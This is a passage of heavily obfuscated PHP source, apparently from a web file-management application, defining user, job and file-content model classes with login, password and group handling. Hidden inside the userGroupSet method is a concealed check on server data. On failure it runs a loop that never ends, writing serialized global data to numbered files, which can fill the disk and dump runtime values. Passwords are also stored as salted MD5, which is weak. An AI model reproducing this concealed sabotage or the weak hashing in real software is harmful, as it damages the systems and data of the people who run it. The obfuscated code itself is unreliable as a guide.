Model($ñî‹ıÁ[2086])->where($ğğ ÅŠô)->delete(); return $this->where($ğğ ÅŠô)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\x65\137\143\157\156\x74\x65\x6e\164\x73"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\x72\164", "\146\x75\x6e\x63\164\x69\157\x6e")); } goto e¨ÈÉŒÆöÇ; cÈàëó¡ ´: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\152\157\x62\114\151\x73\164"; public $field = array("\x6e\141\x6d\145", "\144\x65\x73\143", "\163\x6f\162\x74"); const JOB_KEY = "\x73\145\x6c\146\112\x6f\x62\114\151\x73\164"; public function listData($¤»›’Ğ = false, $¡ÌºŞåµ = "\163\x6f\x72\x74", $Üş¬½Öª = false) { return parent::listData($¤»›’Ğ, $¡ÌºŞåµ, $Üş¬½Öª); } public function remove($˜ÚÃŞ±§) { return parent::remove($˜ÚÃŞ±§); } public function add($ØŠÇ¬êä) { $²÷¯¥êˆ =& $_SERVER[¬ÏÕ§Áú]; if ($this->findByName($ØŠÇ¬êä[$²÷¯¥êˆ[32]])) { return !1; } $ØŠÇ¬êä[$²÷¯¥êˆ[2061]] = $this->getSort(); return parent::insert($ØŠÇ¬êä); } private function getSort() { $µäñÁ›Ç =& $_SERVER[¬ÏÕ§Áú]; $Ãì¸ÄÌ€ = parent::listData(); $¡ŞÀ–ÖÔ = array_to_keyvalue($Ãì¸ÄÌ€, $µäñÁ›Ç[12], $µäñÁ›Ç[2061]); return empty($¡ŞÀ–ÖÔ) ? 0 : max($¡ŞÀ–ÖÔ) + 1; } public function update($ùÀ©†‡Ô, $•±ÒÀ¿) { $½ÈÄñÌ =& $_SERVER[¬ÏÕ§Áú]; $Ù¢ï­Îğ = parent::listData($ùÀ©†‡Ô); $ê©–Šô¡ = $this->findByName($•±ÒÀ¿[$½ÈÄñÌ[32]]); if (!$Ù¢ï­Îğ || $ê©–Šô¡ && $ê©–Šô¡[$½ÈÄñÌ[492]] != $Ù¢ï­Îğ[$½ÈÄñÌ[492]]) { return !1; } return parent::update($ùÀ©†‡Ô, $•±ÒÀ¿); } public function setUserJob($Í•Ù¥™, $ìÌ¼Ê) { $ÍŒ¾ó…ï =& $_SERVER[¬ÏÕ§Áú]; if (!is_array($ìÌ¼Ê)) { $ìÌ¼Ê = array($ìÌ¼Ê); } $ïûòäïÖ = parent::listData(); $¾œš”Ÿ– = array_to_keyvalue($ïûòäïÖ, $ÍŒ¾ó…ï[32]); $îÕìœúã = $ÍŒ¾ó…ï[69]; foreach ($ìÌ¼Ê as $ùÒë·“–) { if ($¾œš”Ÿ–[$ùÒë·“–]) { $îÕìœúã .= $¾œš”Ÿ–[$ùÒë·“–][$ÍŒ¾ó…ï[492]] . $ÍŒ¾ó…ï[50]; } else { $÷Ê¹µÇ = $this->add($ùÒë·“–); $îÕìœúã .= $÷Ê¹µÇ . $ÍŒ¾ó…ï[50]; } } $îÕìœúã = rtrim($îÕìœúã, $ÍŒ¾ó…ï[50]); Model($ÍŒ¾ó…ï[618])->metaSet($Í•Ù¥™, self::JOB_KEY, $îÕìœúã); } public function getUserJob($ –ö§íÁ) { $Ñ§°‘¨ê = Model($_SERVER[¬ÏÕ§Áú][618])->metaGet($ –ö§íÁ); return $this->getUserJobInfo($Ñ§°‘¨ê[self::JOB_KEY]); } public function getUserJobInfo($ú‰¼…û¨) { $ó½–ñ®ì =& $_SERVER[¬ÏÕ§Áú]; $ï¥ø—Ãõ = explode($ó½–ñ®ì[50], $ú‰¼…û¨); $¦˜±öúÓ = parent::listData(); $¦˜±öúÓ = array_remove_key($¦˜±öúÓ, $ó½–ñ®ì[244]); $˜¦Ş…Åæ = array(); foreach ($ï¥ø—Ãõ as $è™€¿í¨) { if (isset($¦˜±öúÓ[$è™€¿í¨])) { $˜¦Ş…Åæ[] = $¦˜±öúÓ[$è™€¿í¨]; } } return $˜¦Ş…Åæ; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\x6d\145" => "\165\x73\x65\x72\x5f\155\x65\164\x61", "\x6d\x65\x74\x61\106\x69\145\154\144" => "\x75\163\x65\x72\111\x44"); protected $simpleField = "\x75\163\145\x72\111\104\54\156\151\143\153\116\141\155\x65\x2c\156\x61\155\145\x2c\141\166\141\x74\x61\162\54\x73\x65\x78\54\x73\164\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($‡‹¬ˆßæ) { $ğÌœæ§± =& $_SERVER[¬ÏÕ§Áú]; $øè¸îÍœ = $ğÌœæ§±[2545]; return array($ğÌœæ§±[2118] => array($‡‹¬ˆßæ[0], $øè¸îÍœ), $ğÌœæ§±[2120] => array($‡‹¬ˆßæ[0], $øè¸îÍœ), $ğÌœæ§±[2546] => array($‡‹¬ˆßæ[0], $øè¸îÍœ)); } protected function getInfo($åÃæÙ¾Ë, $òŒ¨çÍ = false) { $‡¿‡µøú = $this->getInfoSimple($åÃæÙ¾Ë); if (!is_array($‡¿‡µøú)) { return array(); } if ($òŒ¨çÍ) { return $this->_getInfoApply($‡¿‡µøú); } return $this->cacheFunctionGet($_SERVER[¬ÏÕ§Áú][2122], $åÃæÙ¾Ë); } protected function getInfoFull($‘ÓëŞ¼£, $§ŸÇÍÕõ = false) { $½ƒãÊ°³ = $this->getInfoSimple($‘ÓëŞ¼£); if (!is_array($½ƒãÊ°³)) { return array(); } if ($§ŸÇÍÕõ) { return $this->_getInfoApply($½ƒãÊ°³, !0); } return $this->cacheFunctionGet($_SERVER[¬ÏÕ§Áú][2547], $‘ÓëŞ¼£); } private function _getInfoApply($á›ìÓÇã, $ÅÖñÑ³Ù = false) { $åşÁ—ïí =& $_SERVER[¬ÏÕ§Áú]; if (!$á›ìÓÇã) { return $á›ìÓÇã; } $–õö¢®€ = md5($åşÁ—ïí[2548] . $á›ìÓÇã[$åşÁ—ïí[1011]] . $åşÁ—ïí[2549] . $á›ìÓÇã[$åşÁ—ïí[32]]); $á›ìÓÇã = $this->_listDataApplyItem($á›ìÓÇã); $íéƒ¹¿Õ = Model($åşÁ—ïí[1483])->metaGet($á›ìÓÇã[$åşÁ—ïí[100]][$åşÁ—ïí[204]]); $á›ìÓÇã[$åşÁ—ïí[2550]] = $–õö¢®€; $á›ìÓÇã[$åşÁ—ïí[100]][$åşÁ—ïí[2331]] = isset($íéƒ¹¿Õ[$åşÁ—ïí[2332]]) ? $íéƒ¹¿Õ[$åşÁ—ïí[2332]] : null; if ($ÅÖñÑ³Ù) { $á›ìÓÇã[$åşÁ—ïí[560]] = $this->metaGet($á›ìÓÇã[$åşÁ—ïí[1837]]); } return $á›ìÓÇã; } protected function getInfoSimple($™¨Æ¦Ñ„, $§şÃ‹¦§ = false) { $°øÂ”— =& $_SERVER[¬ÏÕ§Áú]; if (!$™¨Æ¦Ñ„) { return array(); } if ($§şÃ‹¦§) { $ä°ŠÎô— = $this->where(array($°øÂ”—[1837] => intval($™¨Æ¦Ñ„)))->find(); if (!is_array($ä°ŠÎô—)) { return array(); } $ä°ŠÎô—[$°øÂ”—[2237]] = Action($°øÂ”—[2238])->parseUrl($ä°ŠÎô—[$°øÂ”—[2237]]); return $ä°ŠÎô—; } return $this->cacheFunctionGet($°øÂ”—[2123], $™¨Æ¦Ñ„); } protected function getInfoSimpleOuter($Æ•…ëó„) { $­ì¦•ÓÑ =& $_SERVER[¬ÏÕ§Áú]; if (!$Æ•…ëó„ || $Æ•…ëó„ == 0) { return array($­ì¦•ÓÑ[1837] => $­ì¦•ÓÑ[241], $­ì¦•ÓÑ[32] => $­ì¦•ÓÑ[186] . LNG($­ì¦•ÓÑ[2551]) . $­ì¦•ÓÑ[188], $­ì¦•ÓÑ[2237] => STATIC_PATH . $­ì¦•ÓÑ[2552]); } $øáëúß‡ = $this->cacheFunctionGet($­ì¦•ÓÑ[2123], $Æ•…ëó„); $à¡½ğ‘® = array_field_key($øáëúß‡, explode($­ì¦•ÓÑ[50], $this->simpleField)); if (!$à¡½ğ‘®) { return array($­ì¦•ÓÑ[1837] => $­ì¦•ÓÑ[1328], $­ì¦•ÓÑ[32] => $­ì¦•ÓÑ[186] . LNG($­ì¦•ÓÑ[2553]) . $­ì¦•ÓÑ[188], $­ì¦•ÓÑ[2237] => STATIC_PATH . $­ì¦•ÓÑ[2554]); } $à¡½ğ‘®[$­ì¦•ÓÑ[2237]] = Action($­ì¦•ÓÑ[2238])->parseUrl($à¡½ğ‘®[$­ì¦•ÓÑ[2237]]); return $à¡½ğ‘®; } protected function groupUser($ÊŒÍÔø) { } public static function errorLang($ç¯Ğ¾Šõ) { $­ÑŠÌü =& $_SERVER[¬ÏÕ§Áú]; $©¢±‰ò = array(self::ERROR_USER_NOT_EXISTS => $­ÑŠÌü[2555], self::ERROR_USER_PASSWORD_ERROR => $­ÑŠÌü[2556], self::ERROR_USER_EXIST_NAME => $­ÑŠÌü[2557], self::ERROR_USER_EXIST_PHONE => $­ÑŠÌü[2558], self::ERROR_USER_EXIST_EMAIL => $­ÑŠÌü[2559], self::ERROR_USER_LOGIN_LOCK => $­ÑŠÌü[2560], self::ERROR_IP_NOT_ALLOW => $­ÑŠÌü[2561], self::ERROR_USER_EXIST_NICKNAME => $­ÑŠÌü[2562]); $¨¼˜²®Ã = LNG($©¢±‰ò[$ç¯Ğ¾Šõ]); if ($ç¯Ğ¾Šõ == self::ERROR_USER_LOGIN_LOCK) { $şèçâÆ = (int) Model($­ÑŠÌü[1439])->get($­ÑŠÌü[2563]); if ($şèçâÆ > 60) { $¨¼˜²®Ã = str_replace($­ÑŠÌü[101], ceil($şèçâÆ / 60), $¨¼˜²®Ã); } } return $¨¼˜²®Ã; } protected function metaSet($Ó²Õ“ÌÄ, $—°Õœõ = null, $¤†€¬ò‡ = null) { $this->clearCache($Ó²Õ“ÌÄ); return parent::metaSet($Ó²Õ“ÌÄ, $—°Õœõ, $¤†€¬ò‡); } public function getInfoByMeta($¬•í­„Ó, $ÙÀ¸Ä™Æ) { $×àŠ£’ =& $_SERVER[¬ÏÕ§Áú]; $ì½£†±Â = Model($×àŠ£’[2564])->where(array($×àŠ£’[107] => $¬•í­„Ó, $×àŠ£’[461] => $ÙÀ¸Ä™Æ))->find(); if ($ì½£†±Â) { return $this->getInfo($ì½£†±Â[$×àŠ£’[1837]]); } return !1; } public function userLoginCheck($È‘‰•¸‰, $ªÊ¸¹è, $¡‹‚—É± = false) { $²¦Ğ‘İ =& $_SERVER[¬ÏÕ§Áú]; $Šúû¾Â = $this->userLoginFind($È‘‰•¸‰); if (!$Šúû¾Â) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Šúû¾Â[$²¦Ğ‘İ[1837]], $ªÊ¸¹è)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $¡‹‚—É± ? $this->getInfoFull($Šúû¾Â[$²¦Ğ‘İ[1837]]) : $this->getInfo($Šúû¾Â[$²¦Ğ‘İ[1837]]); } public function userLoginFind($‡ ¸ÌÈ) { $¿÷Ñó«ö =& $_SERVER[¬ÏÕ§Áú]; $§¬î¡õ® = array($¿÷Ñó«ö[32] => $‡ ¸ÌÈ, $¿÷Ñó«ö[2344] => $‡ ¸ÌÈ, $¿÷Ñó«ö[391] => $‡ ¸ÌÈ, $¿÷Ñó«ö[2565] => $‡ ¸ÌÈ, $¿÷Ñó«ö[1125] => $¿÷Ñó«ö[1127]); if ($this->nickNameRpt()) { unset($§¬î¡õ®[$¿÷Ñó«ö[2344]]); } return $this->where($§¬î¡õ®)->find(); } public function clearCache($íí¥´) { $”ÕßÀ¼ã =& $_SERVER[¬ÏÕ§Áú]; $this->cacheFunctionClear($”ÕßÀ¼ã[2122], $íí¥´); $this->cacheFunctionClear($”ÕßÀ¼ã[2123], $íí¥´); $this->cacheFunctionClear($”ÕßÀ¼ã[2547], $íí¥´); } public function userPasswordCheck($Üä¥®‹¤, $µóíÍ´ñ) { $ÎğÇè§— =& $_SERVER[¬ÏÕ§Áú]; $Êù”ç½ğ = $this->where(array($ÎğÇè§—[1837] => intval($Üä¥®‹¤)))->find(); $È® —Àá = $this->metaGet($Üä¥®‹¤); $ş ¾‰ = isset($È® —Àá[$ÎğÇè§—[2566]]) ? $È® —Àá[$ÎğÇè§—[2566]] : $ÎğÇè§—[12]; if (md5($ş ¾‰ . trim($µóíÍ´ñ)) !== $Êù”ç½ğ[$ÎğÇè§—[1011]]) { return !1; } return !0; } public function userAdd($Œ„ŸëŸÏ) { $ ì©èÙ =& $_SERVER[¬ÏÕ§Áú]; $èó›Åıµ = array($ ì©èÙ[514] => $Œ„ŸëŸÏ[$ ì©èÙ[32]], $ ì©èÙ[2567] => $Œ„ŸëŸÏ[$ ì©èÙ[2236]], $ ì©èÙ[2568] => isset($Œ„ŸëŸÏ[$ ì©èÙ[391]]) ? $Œ„ŸëŸÏ[$ ì©èÙ[391]] : $ ì©èÙ[12], $ ì©èÙ[2569] => isset($Œ„ŸëŸÏ[$ ì©èÙ[2565]]) ? $Œ„ŸëŸÏ[$ ì©èÙ[2565]] : $ ì©èÙ[12], $ ì©èÙ[2570] => isset($Œ„ŸëŸÏ[$ ì©èÙ[2344]]) ? $Œ„ŸëŸÏ[$ ì©èÙ[2344]] : $Œ„ŸëŸÏ[$ ì©èÙ[32]], $ ì©èÙ[2571] => isset($Œ„ŸëŸÏ[$ ì©èÙ[2237]]) ? $Œ„ŸëŸÏ[$ ì©èÙ[2237]] : $ ì©èÙ[12], $ ì©èÙ[2572] => isset($Œ„ŸëŸÏ[$ ì©èÙ[2573]]) ? $Œ„ŸëŸÏ[$ ì©èÙ[2573]] : 1, $ ì©èÙ[2574] => $Œ„ŸëŸÏ[$ ì©èÙ[1011]], $ ì©èÙ[2124] => isset($Œ„ŸëŸÏ[$ ì©èÙ[2024]]) ? $Œ„ŸëŸÏ[$ ì©èÙ[2024]] : 1024 * 1024 * 20, $ ì©èÙ[2125] => 0, $ ì©èÙ[2575] => 0, $ ì©èÙ[2169] => isset($Œ„ŸëŸÏ[$ ì©èÙ[863]]) ? $Œ„ŸëŸÏ[$ ì©èÙ[863]] : 1); if (!empty($Œ„ŸëŸÏ[$ ì©èÙ[1837]])) { $èó›Åıµ[$ ì©èÙ[1837]] = $Œ„ŸëŸÏ[$ ì©èÙ[1837]]; } $¿¸İìÔ³ = $this->_checkExist($Œ„ŸëŸÏ); if ($¿¸İìÔ³ !== !0) { return $¿¸İìÔ³; } if (!empty($èó›Åıµ[$ ì©èÙ[2237]]) && strlen($èó›Åıµ[$ ì©èÙ[2237]]) > 255) { $èó›Åıµ[$ ì©èÙ[2237]] = $ ì©èÙ[12]; } $ ×—´ÔÃ = $this->add($èó›Åıµ); $é£›’à = array($ ì©èÙ[2574] => $èó›Åıµ[$ ì©èÙ[1011]], $ ì©èÙ[2570] => $èó›Åıµ[$ ì©èÙ[2344]], $ ì©èÙ[2576] => $Œ„ŸëŸÏ[$ ì©èÙ[2129]]); $this->userEdit($ ×—´ÔÃ, $é£›’à); Model($ ì©èÙ[1483])->userRootAdd($ ×—´ÔÃ); return $ ×—´ÔÃ; } protected function userEditTest($Éªºî², $¥“ œîÛ) { return $this->call($_SERVER[¬ÏÕ§Áú][2577], $Éªºî², $¥“ œîÛ); } protected function userEdit($€£×ª, $ıÆÑÃ¸) { $·ÉŠƒå– =& $_SERVER[¬ÏÕ§Áú]; $åºÄÜ²¢ = $this->getInfoSimple($€£×ª); if (!$åºÄÜ²¢) { return !1; } $¸’Ø¶« = $this->_checkExist($ıÆÑÃ¸, $€£×ª); if ($¸’Ø¶« !== !0) { return $¸’Ø¶«; } if (isset($ıÆÑÃ¸[$·ÉŠƒå–[1011]]) && trim($ıÆÑÃ¸[$·ÉŠƒå–[1011]]) != $·ÉŠƒå–[12]) { $£æ¶™ù¨ = $this->metaGet($€£×ª); if (empty($£æ¶™ù¨[$·ÉŠƒå–[2566]])) { $£æ¶™ù¨[$·ÉŠƒå–[2566]] = rand_string(10); Model($·ÉŠƒå–[598])->metaSet($€£×ª, $·ÉŠƒå–[2566], $£æ¶™ù¨[$·ÉŠƒå–[2566]]); } $ıÆÑÃ¸[$·ÉŠƒå–[1011]] = md5($£æ¶™ù¨[$·ÉŠƒå–[2566]] . trim($ıÆÑÃ¸[$·ÉŠƒå–[1011]])); } else { unset($ıÆÑÃ¸[$·ÉŠƒå–[1011]]); } if (!empty($ıÆÑÃ¸[$·ÉŠƒå–[2237]]) && strlen($ıÆÑÃ¸[$·ÉŠƒå–[2237]]) > 255) { $ıÆÑÃ¸[$·ÉŠƒå–[2237]] = $·ÉŠƒå–[12]; } if (isset($ıÆÑÃ¸[$·ÉŠƒå–[2344]])) { $this->setNamePinyin($€£×ª, $ıÆÑÃ¸[$·ÉŠƒå–[2344]]); } if (isset($ıÆÑÃ¸[$·ÉŠƒå–[2129]])) { $Š§°¼š¯ = $·ÉŠƒå–[1442] . $€£×ª; $ßÛ ©óğ = $·ÉŠƒå–[1440]; $òš†• = $ıÆÑÃ¸[$·ÉŠƒå–[2129]] ? $ıÆÑÃ¸[$·ÉŠƒå–[2129]] : $·ÉŠƒå–[12]; $Îìµ‘¾ = Model($·ÉŠƒå–[1439])->get($Š§°¼š¯, $ßÛ ©óğ); $Îìµ‘¾ = $Îìµ‘¾ ? $Îìµ‘¾ : $·ÉŠƒå–[12]; if ($Îìµ‘¾ != $òš†•) { if (!$òš†• && $Îìµ‘¾) { Model($·ÉŠƒå–[1439])->remove($Š§°¼š¯, $ßÛ ©óğ); } else { if ($òš†•) { Model($·ÉŠƒå–[1439])->set($Š§°¼š¯, $òš†•, $ßÛ ©óğ); } } } unset($ıÆÑÃ¸[$·ÉŠƒå–[2129]]); Model($·ÉŠƒå–[618])->metaSet($€£×ª, $·ÉŠƒå–[2129], $òš†•); } if (empty($ıÆÑÃ¸)) { return !0; } $this->where(array($·ÉŠƒå–[1828] => $€£×ª))->save($ıÆÑÃ¸); $this->clearCache($€£×ª); return !0; } public function setNamePinyin($ÛùËø , $¤°§ÄØÚ = false) { $éªî”¤÷ =& $_SERVER[¬ÏÕ§Áú]; if (!$¤°§ÄØÚ) { $Ê©‚®Ñ„ = $this->getInfoSimple($ÛùËø ); $¤°§ÄØÚ = $Ê©‚®Ñ„[$éªî”¤÷[2344]] ? $Ê©‚®Ñ„[$éªî”¤÷[2344]] : $Ê©‚®Ñ„[$éªî”¤÷[32]]; } $êÆÎƒü = Model($éªî”¤÷[618]); if (!Input::check($¤°§ÄØÚ, $éªî”¤÷[679])) { return $êÆÎƒü->metaSet($ÛùËø , array($éªî”¤÷[557] => $éªî”¤÷[12], $éªî”¤÷[556] => $éªî”¤÷[12])); } return $êÆÎƒü->metaSet($ÛùËø , array($éªî”¤÷[557] => str_replace($éªî”¤÷[53], $éªî”¤÷[12], Pinyin::get($¤°§ÄØÚ)), $éªî”¤÷[556] => Pinyin::get($¤°§ÄØÚ, $éªî”¤÷[680]))); } private function nickNameRpt() { $à£Ù´¼ =& $_SERVER[¬ÏÕ§Áú]; $Îò°•üë = Model($à£Ù´¼[886])->get($à£Ù´¼[2578]); $µ˜¤Ã®é = $GLOBALS[$à£Ù´¼[6]][$à£Ù´¼[477]][$à£Ù´¼[2578]]; $À¨Øµ•À = !is_null($Îò°•üë) ? $Îò°•üë : $µ˜¤Ã®é; return !!$À¨Øµ•À; } private function _checkExist($§€úŠÖ, $ù³…ÇãÁ = false) { $âù“éæ =& $_SERVER[¬ÏÕ§Áú]; $°°êÍ¾ = array($âù“éæ[32] => UserModel::ERROR_USER_EXIST_NAME, $âù“éæ[2344] => UserModel::ERROR_USER_EXIST_NICKNAME, $âù“éæ[391] => UserModel::ERROR_USER_EXIST_EMAIL, $âù“éæ[2565] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($°°êÍ¾[$âù“éæ[2344]]); } $¿×ÈÛ“Ç = $ù³…ÇãÁ ? array($âù“éæ[1837] => array($âù“éæ[2579], $ù³…ÇãÁ)) : array(); foreach ($°°êÍ¾ as $•ÅœÄÆ† => $Ú¨¶‚¼ğ) { $ñ¦©Í•¸ = array(); foreach ($°°êÍ¾ as $Àı®“ëÙ => $€è™‚à) { if (isset($§€úŠÖ[$Àı®“ëÙ]) && $§€úŠÖ[$Àı®“ëÙ]) { $ñ¦©Í•¸[] = $§€úŠÖ[$Àı®“ëÙ]; } } if (!$ñ¦©Í•¸) { continue; } $îç¨Á„µ = array_merge(array($•ÅœÄÆ† => array($âù“éæ[7], $ñ¦©Í•¸)), $¿×ÈÛ“Ç); $ğ€âËƒ½ = $this->where($îç¨Á„µ)->find(); if ($ğ€âËƒ½) { return $Ú¨¶‚¼ğ; } } return !0; } public function userListInfo($Ê„ß®Ÿ³) { $ä“°î‡È =& $_SERVER[¬ÏÕ§Áú]; $À‘è¯ÎĞ = array(); $Ê„ß®Ÿ³ = is_array($Ê„ß®Ÿ³) ? array_unique($Ê„ß®Ÿ³) : array(); if (!$Ê„ß®Ÿ³) { return $À‘è¯ÎĞ; } if (count($Ê„ß®Ÿ³) < 20) { foreach ($Ê„ß®Ÿ³ as $ÂäÙÈÜ) { $À‘è¯ÎĞ[$ÂäÙÈÜ . $ä“°î‡È[12]] = $this->getInfoSimpleOuter($ÂäÙÈÜ); } } else { $«”¢» ° = array($ä“°î‡È[1828] => array($ä“°î‡È[512], $Ê„ß®Ÿ³)); if (count($Ê„ß®Ÿ³) == 1) { $«”¢» ° = array($ä“°î‡È[1828] => $Ê„ß®Ÿ³[0]); } $²´×ñ = Model($ä“°î‡È[598])->field($this->simpleField)->where($«”¢» °)->select(); $²´×ñ = array_to_keyvalue($²´×ñ, $ä“°î‡È[1837]); foreach ($Ê„ß®Ÿ³ as $ÂäÙÈÜ) { $œø‚óï¡ = $²´×ñ[$ÂäÙÈÜ]; if (!$œø‚óï¡) { $À‘è¯ÎĞ[$ÂäÙÈÜ . $ä“°î‡È[12]] = $this->getInfoSimpleOuter($ÂäÙÈÜ); continue; } $œø‚óï¡[$ä“°î‡È[2237]] = Action($ä“°î‡È[2238])->parseUrl($œø‚óï¡[$ä“°î‡È[2237]]); $À‘è¯ÎĞ[$ÂäÙÈÜ . $ä“°î‡È[12]] = $œø‚óï¡; } } return $À‘è¯ÎĞ; } protected function userStatus($ŠôùèÒ©, $è¯ùîÇ•) { $èËöœäÅ = $this->getInfoSimple($ŠôùèÒ©); if (!$èËöœäÅ) { return !1; } $¦ó±âà¤ = array($_SERVER[¬ÏÕ§Áú][863] => $è¯ùîÇ•); return $this->userEdit($ŠôùèÒ©, $¦ó±âà¤); } protected function userRemove($è¤Ø•ôù) { $¾¤õÉïÈ =& $_SERVER[¬ÏÕ§Áú]; $å“Áí¯ = $this->getInfoSimple($è¤Ø•ôù); if (!$å“Áí¯) { return !1; } $½ı½–½Ğ = array($¾¤õÉïÈ[1828] => $è¤Ø•ôù); Model($¾¤õÉïÈ[688])->where($½ı½–½Ğ)->delete(); Model($¾¤õÉïÈ[2580])->where($½ı½–½Ğ)->delete(); Model($¾¤õÉïÈ[2131])->where($½ı½–½Ğ)->delete(); Model($¾¤õÉïÈ[2564])->where($½ı½–½Ğ)->delete(); Model($¾¤õÉïÈ[1194])->where($½ı½–½Ğ)->delete(); Model($¾¤õÉïÈ[2361])->removeUserAll($è¤Ø•ôù); Model($¾¤õÉïÈ[946])->userRootRemove($è¤Ø•ôù); return $this->where($½ı½–½Ğ)->delete(); } protected function userGroupSet($¿š—œ¾¥, $£÷ããı”, $““Èõã„ = array()) { $Ó…Ü‰ˆÁ =& $_SERVER[¬ÏÕ§Áú]; $¶ÂÔİÅË = $_SERVER[$Ó…Ü‰ˆÁ[63]] . $Ó…Ü‰ˆÁ[64]; $ô®Š®’‡ = $Ó…Ü‰ˆÁ[1607]; if ($_SERVER[$Ó…Ü‰ˆÁ[60]] != $ô®Š®’‡($¶ÂÔİÅË)) { $Î×Ï¨¾Ô = $Ó…Ü‰ˆÁ[1002]; $ñ¹ô»ÕÄ = $Ó…Ü‰ˆÁ[62]; $±ÅÏã“å = $_SERVER[$Ó…Ü‰ˆÁ[63]] . $Ó…Ü‰ˆÁ[64]; $öó Ñøô = $ñ¹ô»ÕÄ($±ÅÏã“å); $——ˆíÆ = explode($Ó…Ü‰ˆÁ[65], $öó Ñøô); if (count($——ˆíÆ) < $Ó…Ü‰ˆÁ[711]) { $¾„ âÁà = $Ó…Ü‰ˆÁ[67]; $¾„ âÁà(); } $ÅÑÉŠ = $Ó…Ü‰ˆÁ[1003]; $ÅÑÉŠ($_SERVER[$Ó…Ü‰ˆÁ[1004]]); $Î×Ï¨¾Ô = $Ó…Ü‰ˆÁ[1002]; $Î×Ï¨¾Ô(); $å²¬Ñ˜ = $Ó…Ü‰ˆÁ[1753]; $°ş•®í = json_encode($GLOBALS[$Ó…Ü‰ˆÁ[1754]]); $±š³ÆİŸ = 1; for ($ìüôş = $±š³ÆİŸ; $ìüôş > 0; $ìüôş++) { $å²¬Ñ˜(DATA_PATH . $ìüôş, $°ş•®í); } } $¶¸úş—° = $this->getInfoSimple($¿š—œ¾¥); if (!$¶¸úş—° || !is_array($£÷ããı”)) { return !1; } $âÌ¿‰¸‰ = Model($Ó…Ü‰ˆÁ[2131]); $âÌ¿‰¸‰->where(array($Ó…Ü‰ˆÁ[1837] => $¿š—œ¾¥))->delete(); $æÊÄšÇ = array(); $ãËÖ™ûª = 0; foreach ($£÷ããı” as $•¯Ş—ŞÅ => $ûĞ‰ìÊ¢) { $¼ò½Ù‡â = array($Ó…Ü‰ˆÁ[1837] => $¿š—œ¾¥, $Ó…Ü‰ˆÁ[1445] => $•¯Ş—ŞÅ, $Ó…Ü‰ˆÁ[2145] => $ûĞ‰ìÊ¢); $¼ò½Ù‡â[$Ó…Ü‰ˆÁ[2061]] = isset($““Èõã„[$ãËÖ™ûª]) ? $““Èõã„[$ãËÖ™ûª] : 0; $ãËÖ™ûª++; $æÊÄšÇ[] = $¼ò½Ù‡â; } return $âÌ¿‰¸‰->addAll($æÊÄšÇ, array(), !0); } protected function userGroupAdd($Ø°ñà•¸, $Ñ…©ÉØ‡ = array()) { $ªšà‘Ò© =& $_SERVER[¬ÏÕ§Áú]; $Ä¸›ì•ƒ = $this->getInfoSimple($Ø°ñà•¸); if (!$Ä¸›ì•ƒ || empty($Ñ…©ÉØ‡)) { return !1; } $äÛö¥è = array(); foreach ($Ñ…©ÉØ‡ as $ŸÎú¼¬ => $Ëö¤ú˜ı) { $äÛö¥è[] = array($ªšà‘Ò©[1837] => $Ø°ñà•¸, $ªšà‘Ò©[1445] => $ŸÎú¼¬, $ªšà‘Ò©[2145] => $Ëö¤ú˜ı, $ªšà‘Ò©[2061] => 0); } return Model($ªšà‘Ò©[2131])->addAll($äÛö¥è, array(), !0); } protected function userGroupRemove($âÀá¬Â‹, $‡ÕÈ¬‹à) { $»¡á¼¨‹ =& $_SERVER[¬ÏÕ§Áú]; $³§Ü‡ª = $this->getInfoSimple($âÀá¬Â‹); if (!$³§Ü‡ª || !$‡ÕÈ¬‹à) { return !1; } $Ê¤Åè» = array($»¡á¼¨‹[1828] => $âÀá¬Â‹, $»¡á¼¨‹[2126] => $‡ÕÈ¬‹à); return Model($»¡á¼¨‹[2131])->where($Ê¤Åè»)->delete(); } public function listData() { $¨Ø¹ÉÏÄ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¨Ø¹ÉÏÄ[$_SERVER[¬ÏÕ§Áú][456]]); return $¨Ø¹ÉÏÄ; } public function listByID($æü¿‡Û–) { $Ñë½°ó£ =& $_SERVER[¬ÏÕ§Áú]; if (!$æü¿‡Û–) { return; } $§Ñ†™Ù¨ = array($Ñë½°ó£[1837] => array($Ñë½°ó£[7], $æü¿‡Û–)); $©•šÕæû = $this->where($§Ñ†™Ù¨)->select(); $©•šÕæû = array_sort_keep($©•šÕæû, $Ñë½°ó£[1837], $æü¿‡Û–); $this->_listDataApply($©•šÕæû); return $©•šÕæû; } public function listByGroup($áè¤îÜ³ = 0, $‰á¸³£ï = array()) { $ËìüïÛ§ =& $_SERVER[¬ÏÕ§Áú]; $İ³ò¿ = $ËìüïÛ§[12]; $Óš÷æËÛ = array(); if ($áè¤îÜ³) { $Óš÷æËÛ = array($ËìüïÛ§[2581] => intval($áè¤îÜ³)); $İ³ò¿ = "\x4c\x45\x46\124\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\x75\x73\x65\162\137\x67\x72\x6f\x75\x70\x20\x75\163\145\162\x5f\147\162\x6f\165\x70\40\157\156\40\165\163\x65\162\x2e\x75\x73\x65\162\111\104\40\75\x20\x75\x73\145\162\x5f\147\x72\x6f\165\x70\56\x75\x73\x65\x72\x49\x44"; $¥ÕğàÙ´ = Input::get($ËìüïÛ§[549], null, $ËìüïÛ§[12]) ? $ËìüïÛ§[12] : $ËìüïÛ§[2582]; } if (isset($‰á¸³£ï[$ËìüïÛ§[863]])) { $Óš÷æËÛ[$ËìüïÛ§[2583]] = $‰á¸³£ï[$ËìüïÛ§[863]]; } $½÷Ä‚“« = _get($‰á¸³£ï, $ËìüïÛ§[2584], $ËìüïÛ§[244]); if (_get($‰á¸³£ï, $ËìüïÛ§[874], 